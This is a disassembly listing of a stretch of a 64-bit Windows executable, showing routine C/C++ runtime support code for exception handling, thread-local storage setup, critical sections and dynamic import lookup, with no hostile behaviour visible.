   140001e03:	e8 04 01 00 00       	call   0x140001f0c
   140001e08:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140001e0c:	e8 cf 46 00 00       	call   0x1400064e0
   140001e11:	cc                   	int3
   140001e12:	cc                   	int3
   140001e13:	cc                   	int3
   140001e14:	48 83 ec 28          	sub    $0x28,%rsp
   140001e18:	e8 ef 00 00 00       	call   0x140001f0c
   140001e1d:	48 83 c0 20          	add    $0x20,%rax
   140001e21:	48 83 c4 28          	add    $0x28,%rsp
   140001e25:	c3                   	ret
   140001e26:	cc                   	int3
   140001e27:	cc                   	int3
   140001e28:	48 83 ec 28          	sub    $0x28,%rsp
   140001e2c:	e8 db 00 00 00       	call   0x140001f0c
   140001e31:	48 83 c0 28          	add    $0x28,%rax
   140001e35:	48 83 c4 28          	add    $0x28,%rsp
   140001e39:	c3                   	ret
   140001e3a:	cc                   	int3
   140001e3b:	cc                   	int3
   140001e3c:	48 83 ec 28          	sub    $0x28,%rsp
   140001e40:	e8 9b 46 00 00       	call   0x1400064e0
   140001e45:	cc                   	int3
   140001e46:	cc                   	int3
   140001e47:	cc                   	int3
   140001e48:	cc                   	int3
   140001e49:	cc                   	int3
   140001e4a:	cc                   	int3
   140001e4b:	cc                   	int3
   140001e4c:	cc                   	int3
   140001e4d:	cc                   	int3
   140001e4e:	cc                   	int3
   140001e4f:	cc                   	int3
   140001e50:	cc                   	int3
   140001e51:	cc                   	int3
   140001e52:	cc                   	int3
   140001e53:	cc                   	int3
   140001e54:	cc                   	int3
   140001e55:	cc                   	int3
   140001e56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001e5d:	00 00 00 
   140001e60:	cc                   	int3
   140001e61:	cc                   	int3
   140001e62:	cc                   	int3
   140001e63:	cc                   	int3
   140001e64:	cc                   	int3
   140001e65:	cc                   	int3
   140001e66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001e6d:	00 00 00 
   140001e70:	cc                   	int3
   140001e71:	cc                   	int3
   140001e72:	cc                   	int3
   140001e73:	cc                   	int3
   140001e74:	cc                   	int3
   140001e75:	cc                   	int3
   140001e76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001e7d:	00 00 00 
   140001e80:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001e85:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140001e8a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140001e8f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140001e96:	e9 05 00 00 00       	jmp    0x140001ea0
   140001e9b:	cc                   	int3
   140001e9c:	cc                   	int3
   140001e9d:	cc                   	int3
   140001e9e:	cc                   	int3
   140001e9f:	cc                   	int3
   140001ea0:	c3                   	ret
   140001ea1:	cc                   	int3
   140001ea2:	cc                   	int3
   140001ea3:	cc                   	int3
   140001ea4:	cc                   	int3
   140001ea5:	cc                   	int3
   140001ea6:	cc                   	int3
   140001ea7:	cc                   	int3
   140001ea8:	cc                   	int3
   140001ea9:	cc                   	int3
   140001eaa:	cc                   	int3
   140001eab:	cc                   	int3
   140001eac:	cc                   	int3
   140001ead:	cc                   	int3
   140001eae:	cc                   	int3
   140001eaf:	cc                   	int3
   140001eb0:	c3                   	ret
   140001eb1:	cc                   	int3
   140001eb2:	cc                   	int3
   140001eb3:	cc                   	int3
   140001eb4:	48 8b 05 95 d3 00 00 	mov    0xd395(%rip),%rax        # 0x14000f250
   140001ebb:	48 8d 15 ca f6 ff ff 	lea    -0x936(%rip),%rdx        # 0x14000158c
   140001ec2:	48 3b c2             	cmp    %rdx,%rax
   140001ec5:	74 23                	je     0x140001eea
   140001ec7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001ece:	00 00 
   140001ed0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140001ed7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140001edb:	72 06                	jb     0x140001ee3
   140001edd:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140001ee1:	76 07                	jbe    0x140001eea
   140001ee3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001ee8:	cd 29                	int    $0x29
   140001eea:	c3                   	ret
   140001eeb:	cc                   	int3
   140001eec:	48 83 ec 28          	sub    $0x28,%rsp
   140001ef0:	48 85 c9             	test   %rcx,%rcx
   140001ef3:	74 11                	je     0x140001f06
   140001ef5:	48 8d 05 54 7c 01 00 	lea    0x17c54(%rip),%rax        # 0x140019b50
   140001efc:	48 3b c8             	cmp    %rax,%rcx
   140001eff:	74 05                	je     0x140001f06
   140001f01:	e8 06 46 00 00       	call   0x14000650c
   140001f06:	48 83 c4 28          	add    $0x28,%rsp
   140001f0a:	c3                   	ret
   140001f0b:	cc                   	int3
   140001f0c:	48 83 ec 28          	sub    $0x28,%rsp
   140001f10:	e8 13 00 00 00       	call   0x140001f28
   140001f15:	48 85 c0             	test   %rax,%rax
   140001f18:	74 05                	je     0x140001f1f
   140001f1a:	48 83 c4 28          	add    $0x28,%rsp
   140001f1e:	c3                   	ret
   140001f1f:	e8 64 46 00 00       	call   0x140006588
   140001f24:	cc                   	int3
   140001f25:	cc                   	int3
   140001f26:	cc                   	int3
   140001f27:	cc                   	int3
   140001f28:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001f2d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001f32:	57                   	push   %rdi
   140001f33:	48 83 ec 20          	sub    $0x20,%rsp
   140001f37:	83 3d 52 71 01 00 ff 	cmpl   $0xffffffff,0x17152(%rip)        # 0x140019090
   140001f3e:	75 07                	jne    0x140001f47
   140001f40:	33 c0                	xor    %eax,%eax
   140001f42:	e9 90 00 00 00       	jmp    0x140001fd7
   140001f47:	ff 15 43 d1 00 00    	call   *0xd143(%rip)        # 0x14000f090
   140001f4d:	8b 0d 3d 71 01 00    	mov    0x1713d(%rip),%ecx        # 0x140019090
   140001f53:	8b f8                	mov    %eax,%edi
   140001f55:	e8 5a 03 00 00       	call   0x1400022b4
   140001f5a:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140001f5e:	33 f6                	xor    %esi,%esi
   140001f60:	48 3b c2             	cmp    %rdx,%rax
   140001f63:	74 67                	je     0x140001fcc
   140001f65:	48 85 c0             	test   %rax,%rax
   140001f68:	74 05                	je     0x140001f6f
   140001f6a:	48 8b f0             	mov    %rax,%rsi
   140001f6d:	eb 5d                	jmp    0x140001fcc
   140001f6f:	8b 0d 1b 71 01 00    	mov    0x1711b(%rip),%ecx        # 0x140019090
   140001f75:	e8 82 03 00 00       	call   0x1400022fc
   140001f7a:	85 c0                	test   %eax,%eax
   140001f7c:	74 4e                	je     0x140001fcc
   140001f7e:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f83:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140001f86:	e8 55 46 00 00       	call   0x1400065e0
   140001f8b:	8b 0d ff 70 01 00    	mov    0x170ff(%rip),%ecx        # 0x140019090
   140001f91:	48 8b d8             	mov    %rax,%rbx
   140001f94:	48 85 c0             	test   %rax,%rax
   140001f97:	74 24                	je     0x140001fbd
   140001f99:	48 8b d0             	mov    %rax,%rdx
   140001f9c:	e8 5b 03 00 00       	call   0x1400022fc
   140001fa1:	85 c0                	test   %eax,%eax
   140001fa3:	74 12                	je     0x140001fb7
   140001fa5:	48 8b c3             	mov    %rbx,%rax
   140001fa8:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140001faf:	48 8b de             	mov    %rsi,%rbx
   140001fb2:	48 8b f0             	mov    %rax,%rsi
   140001fb5:	eb 0d                	jmp    0x140001fc4
   140001fb7:	8b 0d d3 70 01 00    	mov    0x170d3(%rip),%ecx        # 0x140019090
   140001fbd:	33 d2                	xor    %edx,%edx
   140001fbf:	e8 38 03 00 00       	call   0x1400022fc
   140001fc4:	48 8b cb             	mov    %rbx,%rcx
   140001fc7:	e8 40 45 00 00       	call   0x14000650c
   140001fcc:	8b cf                	mov    %edi,%ecx
   140001fce:	ff 15 c4 d0 00 00    	call   *0xd0c4(%rip)        # 0x14000f098
   140001fd4:	48 8b c6             	mov    %rsi,%rax
   140001fd7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001fdc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001fe1:	48 83 c4 20          	add    $0x20,%rsp
   140001fe5:	5f                   	pop    %rdi
   140001fe6:	c3                   	ret
   140001fe7:	cc                   	int3
   140001fe8:	48 83 ec 28          	sub    $0x28,%rsp
   140001fec:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x140001eec
   140001ff3:	e8 2c 02 00 00       	call   0x140002224
   140001ff8:	89 05 92 70 01 00    	mov    %eax,0x17092(%rip)        # 0x140019090
   140001ffe:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002001:	74 25                	je     0x140002028
   140002003:	48 8d 15 46 7b 01 00 	lea    0x17b46(%rip),%rdx        # 0x140019b50
   14000200a:	8b c8                	mov    %eax,%ecx
   14000200c:	e8 eb 02 00 00       	call   0x1400022fc
   140002011:	85 c0                	test   %eax,%eax
   140002013:	74 0e                	je     0x140002023
   140002015:	c7 05 a9 7b 01 00 fe 	movl   $0xfffffffe,0x17ba9(%rip)        # 0x140019bc8
   14000201c:	ff ff ff 
   14000201f:	b0 01                	mov    $0x1,%al
   140002021:	eb 07                	jmp    0x14000202a
   140002023:	e8 08 00 00 00       	call   0x140002030
   140002028:	32 c0                	xor    %al,%al
   14000202a:	48 83 c4 28          	add    $0x28,%rsp
   14000202e:	c3                   	ret
   14000202f:	cc                   	int3
   140002030:	48 83 ec 28          	sub    $0x28,%rsp
   140002034:	8b 0d 56 70 01 00    	mov    0x17056(%rip),%ecx        # 0x140019090
   14000203a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000203d:	74 0c                	je     0x14000204b
   14000203f:	e8 28 02 00 00       	call   0x14000226c
   140002044:	83 0d 45 70 01 00 ff 	orl    $0xffffffff,0x17045(%rip)        # 0x140019090
   14000204b:	b0 01                	mov    $0x1,%al
   14000204d:	48 83 c4 28          	add    $0x28,%rsp
   140002051:	c3                   	ret
   140002052:	cc                   	int3
   140002053:	cc                   	int3
   140002054:	40 53                	rex push %rbx
   140002056:	48 83 ec 20          	sub    $0x20,%rsp
   14000205a:	33 db                	xor    %ebx,%ebx
   14000205c:	48 8d 15 6d 7b 01 00 	lea    0x17b6d(%rip),%rdx        # 0x140019bd0
   140002063:	45 33 c0             	xor    %r8d,%r8d
   140002066:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000206a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000206e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140002073:	e8 d8 02 00 00       	call   0x140002350
   140002078:	85 c0                	test   %eax,%eax
   14000207a:	74 11                	je     0x14000208d
   14000207c:	ff 05 76 7b 01 00    	incl   0x17b76(%rip)        # 0x140019bf8
   140002082:	ff c3                	inc    %ebx
   140002084:	83 fb 01             	cmp    $0x1,%ebx
   140002087:	72 d3                	jb     0x14000205c
   140002089:	b0 01                	mov    $0x1,%al
   14000208b:	eb 07                	jmp    0x140002094
   14000208d:	e8 0a 00 00 00       	call   0x14000209c
   140002092:	32 c0                	xor    %al,%al
   140002094:	48 83 c4 20          	add    $0x20,%rsp
   140002098:	5b                   	pop    %rbx
   140002099:	c3                   	ret
   14000209a:	cc                   	int3
   14000209b:	cc                   	int3
   14000209c:	40 53                	rex push %rbx
   14000209e:	48 83 ec 20          	sub    $0x20,%rsp
   1400020a2:	8b 1d 50 7b 01 00    	mov    0x17b50(%rip),%ebx        # 0x140019bf8
   1400020a8:	eb 1d                	jmp    0x1400020c7
   1400020aa:	48 8d 05 1f 7b 01 00 	lea    0x17b1f(%rip),%rax        # 0x140019bd0
   1400020b1:	ff cb                	dec    %ebx
   1400020b3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400020b7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400020bb:	ff 15 ef cf 00 00    	call   *0xcfef(%rip)        # 0x14000f0b0
   1400020c1:	ff 0d 31 7b 01 00    	decl   0x17b31(%rip)        # 0x140019bf8
   1400020c7:	85 db                	test   %ebx,%ebx
   1400020c9:	75 df                	jne    0x1400020aa
   1400020cb:	b0 01                	mov    $0x1,%al
   1400020cd:	48 83 c4 20          	add    $0x20,%rsp
   1400020d1:	5b                   	pop    %rbx
   1400020d2:	c3                   	ret
   1400020d3:	cc                   	int3
   1400020d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400020de:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400020e3:	57                   	push   %rdi
   1400020e4:	41 54                	push   %r12
   1400020e6:	41 55                	push   %r13
   1400020e8:	41 56                	push   %r14
   1400020ea:	41 57                	push   %r15
   1400020ec:	48 83 ec 20          	sub    $0x20,%rsp
   1400020f0:	8b f9                	mov    %ecx,%edi
   1400020f2:	4c 8d 3d 07 df ff ff 	lea    -0x20f9(%rip),%r15        # 0x140000000
   1400020f9:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   1400020fd:	4d 8b e1             	mov    %r9,%r12
   140002100:	49 8b e8             	mov    %r8,%rbp
   140002103:	4c 8b ea             	mov    %rdx,%r13
   140002106:	49 8b 84 ff 80 9c 01 	mov    0x19c80(%r15,%rdi,8),%rax
   14000210d:	00 
   14000210e:	90                   	nop
   14000210f:	49 3b c6             	cmp    %r14,%rax
   140002112:	0f 84 ae 00 00 00    	je     0x1400021c6
   140002118:	48 85 c0             	test   %rax,%rax
   14000211b:	0f 85 a7 00 00 00    	jne    0x1400021c8
   140002121:	4d 3b c1             	cmp    %r9,%r8
   140002124:	0f 84 94 00 00 00    	je     0x1400021be
   14000212a:	8b 75 00             	mov    0x0(%rbp),%esi
   14000212d:	49 8b 9c f7 68 9c 01 	mov    0x19c68(%r15,%rsi,8),%rbx
   140002134:	00 
   140002135:	90                   	nop
   140002136:	48 85 db             	test   %rbx,%rbx
   140002139:	74 0b                	je     0x140002146
   14000213b:	49 3b de             	cmp    %r14,%rbx
   14000213e:	0f 85 c1 00 00 00    	jne    0x140002205
   140002144:	eb 6b                	jmp    0x1400021b1
   140002146:	4d 8b bc f7 38 01 01 	mov    0x10138(%r15,%rsi,8),%r15
   14000214d:	00 
   14000214e:	33 d2                	xor    %edx,%edx
   140002150:	49 8b cf             	mov    %r15,%rcx
   140002153:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140002159:	ff 15 91 cf 00 00    	call   *0xcf91(%rip)        # 0x14000f0f0
   14000215f:	48 8b d8             	mov    %rax,%rbx
   140002162:	48 85 c0             	test   %rax,%rax
   140002165:	75 7e                	jne    0x1400021e5
   140002167:	ff 15 23 cf 00 00    	call   *0xcf23(%rip)        # 0x14000f090
   14000216d:	83 f8 57             	cmp    $0x57,%eax
   140002170:	75 2d                	jne    0x14000219f
   140002172:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140002176:	49 8b cf             	mov    %r15,%rcx
   140002179:	48 8d 15 68 e0 00 00 	lea    0xe068(%rip),%rdx        # 0x1400101e8
   140002180:	e8 eb 45 00 00       	call   0x140006770
   140002185:	85 c0                	test   %eax,%eax
   140002187:	74 16                	je     0x14000219f
   140002189:	45 33 c0             	xor    %r8d,%r8d
   14000218c:	33 d2                	xor    %edx,%edx
   14000218e:	49 8b cf             	mov    %r15,%rcx
   140002191:	ff 15 59 cf 00 00    	call   *0xcf59(%rip)        # 0x14000f0f0
   140002197:	48 8b d8             	mov    %rax,%rbx
   14000219a:	48 85 c0             	test   %rax,%rax
   14000219d:	75 46                	jne    0x1400021e5
   14000219f:	49 8b c6             	mov    %r14,%rax
   1400021a2:	4c 8d 3d 57 de ff ff 	lea    -0x21a9(%rip),%r15        # 0x140000000
   1400021a9:	49 87 84 f7 68 9c 01 	xchg   %rax,0x19c68(%r15,%rsi,8)
   1400021b0:	00 
   1400021b1:	48 83 c5 04          	add    $0x4,%rbp
   1400021b5:	49 3b ec             	cmp    %r12,%rbp
   1400021b8:	0f 85 6c ff ff ff    	jne    0x14000212a
   1400021be:	4d 87 b4 ff 80 9c 01 	xchg   %r14,0x19c80(%r15,%rdi,8)
   1400021c5:	00 
   1400021c6:	33 c0                	xor    %eax,%eax
   1400021c8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400021cd:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400021d2:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400021d7:	48 83 c4 20          	add    $0x20,%rsp
   1400021db:	41 5f                	pop    %r15
   1400021dd:	41 5e                	pop    %r14
   1400021df:	41 5d                	pop    %r13
   1400021e1:	41 5c                	pop    %r12
   1400021e3:	5f                   	pop    %rdi
   1400021e4:	c3                   	ret
   1400021e5:	48 8b c3             	mov    %rbx,%rax
   1400021e8:	4c 8d 3d 11 de ff ff 	lea    -0x21ef(%rip),%r15        # 0x140000000
   1400021ef:	49 87 84 f7 68 9c 01 	xchg   %rax,0x19c68(%r15,%rsi,8)
   1400021f6:	00 
   1400021f7:	48 85 c0             	test   %rax,%rax
   1400021fa:	74 09                	je     0x140002205
   1400021fc:	48 8b cb             	mov    %rbx,%rcx
   1400021ff:	ff 15 db ce 00 00    	call   *0xcedb(%rip)        # 0x14000f0e0
   140002205:	49 8b d5             	mov    %r13,%rdx
   140002208:	48 8b cb             	mov    %rbx,%rcx
   14000220b:	ff 15 d7 ce 00 00    	call   *0xced7(%rip)        # 0x14000f0e8
   140002211:	48 85 c0             	test   %rax,%rax
   140002214:	74 a8                	je     0x1400021be
   140002216:	48 8b c8             	mov    %rax,%rcx
   140002219:	49 87 8c ff 80 9c 01 	xchg   %rcx,0x19c80(%r15,%rdi,8)
   140002220:	00 
   140002221:	eb a5                	jmp    0x1400021c8
   140002223:	cc                   	int3
   140002224:	40 53                	rex push %rbx
   140002226:	48 83 ec 20          	sub    $0x20,%rsp
   14000222a:	48 8b d9             	mov    %rcx,%rbx
   14000222d:	4c 8d 0d cc df 00 00 	lea    0xdfcc(%rip),%r9        # 0x140010200
   140002234:	33 c9                	xor    %ecx,%ecx
   140002236:	4c 8d 05 bb df 00 00 	lea    0xdfbb(%rip),%r8        # 0x1400101f8
   14000223d:	48 8d 15 bc df 00 00 	lea    0xdfbc(%rip),%rdx        # 0x140010200
   140002244:	e8 8b fe ff ff       	call   0x1400020d4
   140002249:	48 85 c0             	test   %rax,%rax
   14000224c:	74 0f                	je     0x14000225d
   14000224e:	48 8b cb             	mov    %rbx,%rcx
   140002251:	48 83 c4 20          	add    $0x20,%rsp
   140002255:	5b                   	pop    %rbx
   140002256:	48 ff 25 03 d0 00 00 	rex.W jmp *0xd003(%rip)        # 0x14000f260
   14000225d:	48 83 c4 20          	add    $0x20,%rsp
   140002261:	5b                   	pop    %rbx
   140002262:	48 ff 25 57 ce 00 00 	rex.W jmp *0xce57(%rip)        # 0x14000f0c0
   140002269:	cc                   	int3
   14000226a:	cc                   	int3
   14000226b:	cc                   	int3
   14000226c:	40 53                	rex push %rbx
   14000226e:	48 83 ec 20          	sub    $0x20,%rsp
   140002272:	8b d9                	mov    %ecx,%ebx
   140002274:	4c 8d 0d 9d df 00 00 	lea    0xdf9d(%rip),%r9        # 0x140010218
   14000227b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002280:	4c 8d 05 89 df 00 00 	lea    0xdf89(%rip),%r8        # 0x140010210
   140002287:	48 8d 15 8a df 00 00 	lea    0xdf8a(%rip),%rdx        # 0x140010218
   14000228e:	e8 41 fe ff ff       	call   0x1400020d4
   140002293:	8b cb                	mov    %ebx,%ecx
   140002295:	48 85 c0             	test   %rax,%rax
   140002298:	74 0c                	je     0x1400022a6
   14000229a:	48 83 c4 20          	add    $0x20,%rsp
   14000229e:	5b                   	pop    %rbx
   14000229f:	48 ff 25 ba cf 00 00 	rex.W jmp *0xcfba(%rip)        # 0x14000f260
   1400022a6:	48 83 c4 20          	add    $0x20,%rsp
   1400022aa:	5b                   	pop    %rbx
   1400022ab:	48 ff 25 26 ce 00 00 	rex.W jmp *0xce26(%rip)        # 0x14000f0d8
   1400022b2:	cc                   	int3
   1400022b3:	cc                   	int3
   1400022b4:	40 53                	rex push %rbx
   1400022b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400022ba:	8b d9                	mov    %ecx,%ebx
   1400022bc:	4c 8d 0d 65 df 00 00 	lea    0xdf65(%rip),%r9        # 0x140010228
   1400022c3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400022c8:	4c 8d 05 51 df 00 00 	lea    0xdf51(%rip),%r8        # 0x140010220
   1400022cf:	48 8d 15 52 df 00 00 	lea    0xdf52(%rip),%rdx        # 0x140010228
   1400022d6:	e8 f9 fd ff ff       	call   0x1400020d4
   1400022db:	8b cb                	mov    %ebx,%ecx
   1400022dd:	48 85 c0             	test   %rax,%rax
   1400022e0:	74 0c                	je     0x1400022ee
   1400022e2:	48 83 c4 20          	add    $0x20,%rsp
   1400022e6:	5b                   	pop    %rbx
   1400022e7:	48 ff 25 72 cf 00 00 	rex.W jmp *0xcf72(%rip)        # 0x14000f260
   1400022ee:	48 83 c4 20          	add    $0x20,%rsp
   1400022f2:	5b                   	pop    %rbx
   1400022f3:	48 ff 25 ce cd 00 00 	rex.W jmp *0xcdce(%rip)        # 0x14000f0c8
   1400022fa:	cc                   	int3
   1400022fb:	cc                   	int3
   1400022fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002301:	57                   	push   %rdi
   140002302:	48 83 ec 20          	sub    $0x20,%rsp
   140002306:	48 8b da             	mov    %rdx,%rbx
   140002309:	4c 8d 0d 30 df 00 00 	lea    0xdf30(%rip),%r9        # 0x140010240
   140002310:	8b f9                	mov    %ecx,%edi
   140002312:	48 8d 15 27 df 00 00 	lea    0xdf27(%rip),%rdx        # 0x140010240
   140002319:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000231e:	4c 8d 05 13 df 00 00 	lea    0xdf13(%rip),%r8        # 0x140010238
   140002325:	e8 aa fd ff ff       	call   0x1400020d4
   14000232a:	48 8b d3             	mov    %rbx,%rdx
   14000232d:	8b cf                	mov    %edi,%ecx
   14000232f:	48 85 c0             	test   %rax,%rax
   140002332:	74 08                	je     0x14000233c
   140002334:	ff 15 26 cf 00 00    	call   *0xcf26(%rip)        # 0x14000f260
   14000233a:	eb 06                	jmp    0x140002342
   14000233c:	ff 15 8e cd 00 00    	call   *0xcd8e(%rip)        # 0x14000f0d0
   140002342:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002347:	48 83 c4 20          	add    $0x20,%rsp
   14000234b:	5f                   	pop    %rdi
   14000234c:	c3                   	ret
   14000234d:	cc                   	int3
   14000234e:	cc                   	int3
   14000234f:	cc                   	int3
   140002350:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002355:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000235a:	57                   	push   %rdi
   14000235b:	48 83 ec 20          	sub    $0x20,%rsp
   14000235f:	41 8b f0             	mov    %r8d,%esi
   140002362:	4c 8d 0d ef de 00 00 	lea    0xdeef(%rip),%r9        # 0x140010258
   140002369:	8b da                	mov    %edx,%ebx
   14000236b:	4c 8d 05 de de 00 00 	lea    0xdede(%rip),%r8        # 0x140010250
   140002372:	48 8b f9             	mov    %rcx,%rdi
   140002375:	48 8d 15 dc de 00 00 	lea    0xdedc(%rip),%rdx        # 0x140010258
   14000237c:	b9 04 00 00 00       	mov    $0x4,%ecx
   140002381:	e8 4e fd ff ff       	call   0x1400020d4
   140002386:	8b d3                	mov    %ebx,%edx
   140002388:	48 8b cf             	mov    %rdi,%rcx
   14000238b:	48 85 c0             	test   %rax,%rax
   14000238e:	74 0b                	je     0x14000239b
   140002390:	44 8b c6             	mov    %esi,%r8d
   140002393:	ff 15 c7 ce 00 00    	call   *0xcec7(%rip)        # 0x14000f260
   140002399:	eb 06                	jmp    0x1400023a1
   14000239b:	ff 15 17 cd 00 00    	call   *0xcd17(%rip)        # 0x14000f0b8
   1400023a1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400023a6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400023ab:	48 83 c4 20          	add    $0x20,%rsp
   1400023af:	5f                   	pop    %rdi
   1400023b0:	c3                   	ret
   1400023b1:	cc                   	int3
   1400023b2:	cc                   	int3
   1400023b3:	cc                   	int3
   1400023b4:	48 8b c4             	mov    %rsp,%rax
   1400023b7:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1400023bb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400023bf:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400023c3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400023c7:	53                   	push   %rbx
   1400023c8:	48 83 ec 70          	sub    $0x70,%rsp
   1400023cc:	48 8b d9             	mov    %rcx,%rbx
   1400023cf:	83 60 c8 00          	andl   $0x0,-0x38(%rax)
   1400023d3:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   1400023d7:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   1400023db:	e8 2c fb ff ff       	call   0x140001f0c
   1400023e0:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400023e5:	8b 0b                	mov    (%rbx),%ecx
   1400023e7:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400023eb:	ff 15 6f ce 00 00    	call   *0xce6f(%rip)        # 0x14000f260
   1400023f1:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   1400023f8:	00 
   1400023f9:	eb 00                	jmp    0x1400023fb
   1400023fb:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1400023ff:	48 83 c4 70          	add    $0x70,%rsp
   140002403:	5b                   	pop    %rbx
   140002404:	c3                   	ret
   140002405:	cc                   	int3
   140002406:	cc                   	int3
   140002407:	cc                   	int3
   140002408:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000240d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002412:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002417:	57                   	push   %rdi
   140002418:	48 83 ec 20          	sub    $0x20,%rsp
   14000241c:	8b 79 0c             	mov    0xc(%rcx),%edi
   14000241f:	8b f2                	mov    %edx,%esi
   140002421:	48 8b e9             	mov    %rcx,%rbp
   140002424:	85 ff                	test   %edi,%edi
   140002426:	74 2b                	je     0x140002453
   140002428:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   14000242b:	8b fb                	mov    %ebx,%edi
   14000242d:	e8 da fa ff ff       	call   0x140001f0c
   140002432:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140002436:	48 8b 40 60          	mov    0x60(%rax),%rax
   14000243a:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   14000243e:	48 63 45 10          	movslq 0x10(%rbp),%rax
   140002442:	48 03 c1             	add    %rcx,%rax
   140002445:	3b 70 04             	cmp    0x4(%rax),%esi
   140002448:	7e 05                	jle    0x14000244f
   14000244a:	3b 70 08             	cmp    0x8(%rax),%esi
   14000244d:	7e 06                	jle    0x140002455
   14000244f:	85 db                	test   %ebx,%ebx
   140002451:	75 d5                	jne    0x140002428
   140002453:	33 c0                	xor    %eax,%eax
   140002455:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000245a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000245f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002464:	48 83 c4 20          	add    $0x20,%rsp
   140002468:	5f                   	pop    %rdi
   140002469:	c3                   	ret
   14000246a:	cc                   	int3
   14000246b:	cc                   	int3
   14000246c:	40 53                	rex push %rbx
   14000246e:	48 83 ec 20          	sub    $0x20,%rsp
   140002472:	48 8b da             	mov    %rdx,%rbx
   140002475:	48 8b d1             	mov    %rcx,%rdx
   140002478:	48 8b cb             	mov    %rbx,%rcx
   14000247b:	e8 9c 05 00 00       	call   0x140002a1c
   140002480:	8b d0                	mov    %eax,%edx
   140002482:	48 8b cb             	mov    %rbx,%rcx
   140002485:	e8 7e ff ff ff       	call   0x140002408
   14000248a:	48 85 c0             	test   %rax,%rax
   14000248d:	0f 95 c0             	setne  %al
   140002490:	48 83 c4 20          	add    $0x20,%rsp
   140002494:	5b                   	pop    %rbx
   140002495:	c3                   	ret
   140002496:	cc                   	int3
   140002497:	cc                   	int3
   140002498:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000249d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400024a2:	57                   	push   %rdi
   1400024a3:	48 83 ec 20          	sub    $0x20,%rsp
   1400024a7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400024ac:	49 8b d8             	mov    %r8,%rbx
   1400024af:	48 8b fa             	mov    %rdx,%rdi
   1400024b2:	e8 45 00 00 00       	call   0x1400024fc
   1400024b7:	48 8b d7             	mov    %rdi,%rdx
   1400024ba:	48 8b cb             	mov    %rbx,%rcx
   1400024bd:	48 8b f0             	mov    %rax,%rsi
   1400024c0:	e8 57 05 00 00       	call   0x140002a1c
   1400024c5:	8b d0                	mov    %eax,%edx
   1400024c7:	48 8b cb             	mov    %rbx,%rcx
   1400024ca:	e8 39 ff ff ff       	call   0x140002408
   1400024cf:	48 85 c0             	test   %rax,%rax
   1400024d2:	75 06                	jne    0x1400024da
